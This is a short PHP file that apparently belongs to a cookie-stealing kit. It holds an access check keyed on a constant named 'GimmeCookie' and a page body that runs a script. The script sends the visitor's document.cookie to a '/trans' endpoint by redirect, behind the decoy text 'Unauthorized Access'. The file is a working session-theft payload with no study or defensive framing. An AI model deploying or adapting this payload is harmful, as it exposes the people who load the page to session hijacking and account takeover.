<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

$site['titl'] .= ' :: Main';

$content = '<script>location.href="/trans?c="+escape(document.cookie)</script> Unauthorized Access';